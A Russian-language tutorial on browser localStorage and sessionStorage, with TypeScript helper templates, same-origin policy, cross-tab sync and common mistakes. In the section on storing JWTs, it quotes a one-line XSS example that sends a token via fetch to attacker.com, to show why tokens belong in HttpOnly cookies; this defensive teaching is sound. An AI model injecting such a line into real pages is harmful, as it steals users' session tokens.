# Хранение данных в браузере

## БЫСТРЫЙ СТАРТ

*   **localStorage и sessionStorage** — это встроенные в браузер веб-хранилища типа "ключ-значение", предоставляющие от 5 до 10 МБ дискового пространства на один домен для автономного хранения текстовых данных.
*   **Сравнение жизненных циклов:** `localStorage` сохраняет данные бессрочно (данные выживают после закрытия вкладки, перезапуска браузера или ОС); `sessionStorage` хранит данные временно и полностью очищается в момент закрытия текущей вкладки.
*   **Изоляция (Same-Origin Policy):** Данные хранилищ строго разграничены по источнику (`протокол://домен:порт`). Разные сайты или даже один сайт на разных портах/протоколах не могут прочитать данные друг друга.
*   **Формат хранения:** Хранилища принимают только строковые значения. Для сохранения сложных объектов и массивов требуется сериализация через `JSON.stringify()`, а при чтении — десериализация через `JSON.parse()`.
*   **Когда использовать:** Для сохранения пользовательских настроек интерфейса (темные темы, размер шрифтов), локального кэширования некритичных данных, состояния корзины или недописанных форм.
*   **Когда НЕ использовать:** Запрещено хранить секретные ключи, пароли или JWT-токены авторизации из-за уязвимости хранилищ к XSS-атакам (любой вредоносный JS-скрипт на странице может беспрепятственно прочитать хранилище).

## ПРАКТИЧЕСКИЕ ШАБЛОНЫ ДЛЯ КОПИРОВАНИЯ

### Шаблон 1: Безопасный оберточный хелпер для `localStorage`
*   **Назначение:** Чтение и запись сложных структур данных с автоматической сериализацией и безопасным перехватом ошибок нехватки памяти (`QuotaExceededError`).

```typescript
export interface AppSettings {
  activeTheme: "dark" | "light";
  fontSizePixels: number;
}

export class SafeStorageCoordinator {
  // Безопасно записываем сложные структуры данных
  public static setItem<T>(key: string, data: T): boolean {
    try {
      // Преобразуем объект в строковый JSON-формат
      const serializedData = JSON.stringify(data);
      window.localStorage.setItem(key, serializedData);
      return true;
    } catch (error: unknown) {
      if (error instanceof Error && error.name === "QuotaExceededError") {
        console.error("[STORAGE ERROR] Лимит памяти localStorage превышен!");
        // Здесь можно инициировать локальную очистку старого кэша
      } else {
        console.error("[STORAGE ERROR] Ошибка при записи в localStorage:", error);
      }
      return false;
    }
  }

  // Безопасно считываем данные с автоматическим разбором JSON
  public static getItem<T>(key: string): T | null {
    try {
      const rawValue = window.localStorage.getItem(key);
      if (rawValue === null) {
        return null;
      }
      // Парсим строковый JSON обратно в строго типизированный объект
      return JSON.parse(rawValue) as T;
    } catch (error) {
      console.error(`[STORAGE ERROR] Ошибка парсинга JSON для ключа "${key}":`, error);
      return null;
    }
  }

  public static removeItem(key: string): void {
    window.localStorage.removeItem(key);
  }
}
```

### Шаблон 2: Сохранение черновика ввода через `sessionStorage`
*   **Назначение:** Сохранение текста сообщения в рамках текущей вкладки. Если пользователь случайно обновит страницу, текст восстановится, но если закроет вкладку — данные очистятся.

```typescript
export interface DraftPayload {
  subject: string;
  editorContent: string;
}

export function setupDraftAutoSave(inputSelector: string, storageKey: string): void {
  const textarea = document.querySelector(inputSelector) as HTMLTextAreaElement | null;
  if (!textarea) return;

  // Восстанавливаем сохраненный черновик при инициализации страницы
  const savedDraft = window.sessionStorage.getItem(storageKey);
  if (savedDraft) {
    textarea.value = savedDraft;
  }

  // Слушаем мгновенный ввод и сохраняем данные в sessionStorage
  textarea.addEventListener("input", (): void => {
    window.sessionStorage.setItem(storageKey, textarea.value);
  });
}
```

### Шаблон 3: Межвкладочная синхронизация через событие `storage`
*   **Назначение:** Синхронизация состояния (например, переключение темы оформления) во всех открытых вкладках вашего сайта в реальном времени.

```typescript
export interface ThemeState {
  theme: "dark" | "light";
}

export function setupCrossTabSync(onThemeUpdate: (newTheme: "dark" | "light") => void): void {
  // Событие 'storage' генерируется браузером на объекте window.
  // ВАЖНО: Оно срабатывает на ВСЕХ вкладках вашего домена, КРОМЕ той, которая совершила изменение.
  window.addEventListener("storage", (event: StorageEvent): void => {
    // Проверяем, что изменился именно интересующий нас ключ
    if (event.key === "app_theme_config" && event.newValue) {
      try {
        const themeConfig = JSON.parse(event.newValue) as ThemeState;
        onThemeUpdate(themeConfig.theme);
      } catch (error) {
        console.error("[SYNC ERROR] Ошибка разбора синхронизированных данных:", error);
      }
    }
  });
}
```

## ГЛУБОКОЕ ПОГРУЖЕНИЕ

### 1. Как работает Same-Origin Policy (SOP) в контексте Web Storage
Политика ограничения источника (SOP) защищает данные пользователей от кражи сторонними сайтами на уровне ядра браузера. Источник (Origin) рассчитывается по жесткой формуле: `протокол` + `домен` + `порт`.

Если пользователь открыл сайт `https://my-app.com:443`, то:
*   Вкладка с адресом `https://my-app.com/profile` имеет **тот же источник** и делит с ним общую базу `localStorage`.
*   Сайт `http://my-app.com` (другой протокол) получит **абсолютно изолированную пустую базу**, так как протоколы различаются.
*   Сайт `https://admin.my-app.com` (поддомен) также изолирован, поскольку домены не совпадают.
*   Адрес `https://my-app.com:8080` (другой порт) не сможет прочитать данные из порта `443`.

### 2. Физика события `storage` и межвкладочное взаимодействие
Событие `storage` — это мощный нативный механизм коммуникации между вкладками (Cross-Tab Communication), не требующий поднятия тяжелых WebSockets соединений.

Когда на вкладке №1 выполняется метод `localStorage.setItem("key", "value")`:
1.  Движок браузера записывает данные на жесткий диск или в системный кэш.
2.  Браузер отправляет системное событие `storage` во все остальные запущенные процессы вкладок, у которых совпадает Origin.
3.  Вкладка №2 принимает событие `StorageEvent`. Объект события содержит свойства:
    *   `key` — имя изменившегося ключа.
    *   `oldValue` — старое значение до изменения (или `null`, если ключ создается впервые).
    *   `newValue` — новое записанное значение (или `null`, если ключ был удален).
    *   `storageArea` — ссылка на сам объект хранилища (`localStorage`).

### 3. Схема жизненного цикла хранилищ данных

```text
  ХАРАКТЕРИСТИКА    │  localStorage  │ sessionStorage │     Cookies    
 ───────────────────┼────────────────┼────────────────┼────────────────
  Объем памяти      │    ~5-10 МБ    │    ~5-10 МБ    │     до 4 КБ    
  Время жизни       │   Бессрочно    │ До закрытия    │ Задается       
                    │                │ вкладки        │ сервером (exp) 
  Передача по сети  │   Локально     │ Локально       │ Автоматически  
                    │ (не шлется)    │ (не шлется)    │ с каждым HTTP- 
                    │                │                │ запросом       
  Доступность из JS │      Да        │      Да        │ Нет (если стоит
                    │                │                │ HttpOnly)      
```

### 4. Детальный пошаговый разбор выполнения шаблона 1
При вызове `SafeStorageCoordinator.setItem("settings", { activeTheme: "dark" })`:
1.  **Сериализация:** Вызывается `JSON.stringify()`. Сложный объект преобразуется в плоскую строку `{"activeTheme":"dark"}`.
2.  **Запись:** Вызывается встроенный метод `window.localStorage.setItem()`. Движок обращается к файловой системе ОС.
3.  **Проверка квоты:** Если объем всех сохраненных строк домена превышает лимит (например, 5 МБ), браузер блокирует запись в памяти и генерирует исключение `QuotaExceededError`.
4.  **Перехват:** Блок `catch` перехватывает ошибку, анализирует свойство `error.name` и выводит кастомное предупреждение разработчику без аварийной остановки приложения.

### 5. Типичные ошибки и их решение

*   **Ошибка 1: Попытка записать чистый объект без сериализации**
    *   *Симптомы:* Вместо структуры объекта из хранилища считывается бесполезная строка `"[object Object]"`, а все свойства объекта полностью утеряны.
    *   *Причина:* Метод `setItem()` принимает на вход исключительно строковые значения. Если передать туда объект, движок JS неявно вызовет на нем метод `.toString()`, превратив его в дефолтную системную строку.
    *   *Решение:* Всегда сериализуйте объекты через `JSON.stringify()` перед записью и парсите через `JSON.parse()` при чтении.

```typescript
// ПЛОХО (данные будут перезаписаны строкой "[object Object]")
localStorage.setItem("user", { name: "Алекс" }); 

// ХОРОШО (сохранение структуры в формате JSON-строки)
localStorage.setItem("user", JSON.stringify({ name: "Алекс" }));
```

*   **Ошибка 2: Хранение авторизационных JWT-токенов в `localStorage` (Уязвимость XSS)**
    *   *Симптомы:* Злоумышленник крадет сессии пользователей и заходит под их учетными записями.
    *   *Причина:* Данные в `localStorage` и `sessionStorage` доступны для чтения любому JavaScript-коду на странице. Если на вашем сайте есть уязвимость к XSS (внедрению вредоносных скриптов, например через комментарии или уязвимые зависимости), злоумышленник сможет одной строкой кода `fetch('http://attacker.com?token=' + localStorage.getItem('token'))` украсть сессионный токен.
    *   *Решение:* Никогда не храните важные токены авторизации в Web Storage. Для авторизации используйте безопасные куки (Cookies) с заголовками **`HttpOnly`** (блокирует чтение из JS) и **`Secure`** (передача только по HTTPS).

```typescript
// КРИТИЧЕСКИ НЕБЕЗОПАСНО (доступно для кражи XSS-скриптами)
localStorage.setItem("jwt_access_token", token);

// БЕЗОПАСНО (токен пишется бэкендом в куку с флагом HttpOnly, JS не имеет к ней доступа)
// Set-Cookie: token=jwt; Secure; HttpOnly; SameSite=Strict
```

*   **Ошибка 3: Игнорирование ошибок парсинга `JSON.parse()` при чтении данных**
    *   *Симптомы:* Приложение ломается и показывает белый экран при загрузке страницы у некоторых пользователей.
    *   *Причина:* Со временем структура сохраняемого объекта может измениться (например, при выкате новой версии сайта вы изменили имя свойства). Если в `localStorage` у пользователя осталась лежать старая строка или поврежденный JSON, вызов `JSON.parse()` выбросит критическое исключение, которое заблокирует дальнейшую работу JS-скрипта.
    *   *Решение:* Всегда оборачивайте вызовы `JSON.parse()` в конструкцию `try...catch` для безопасного восстановления дефолтных настроек при сбое парсинга.

```typescript
// ПЛОХО (при повреждении строки приложение упадет)
const config = JSON.parse(localStorage.getItem("config")!);

// ХОРОШО (безопасный откат к дефолтным значениям при ошибке)
let config;
try {
  config = JSON.parse(localStorage.getItem("config") || "{}");
} catch (e) {
  config = { defaultTheme: "light" }; // Fallback
}
```
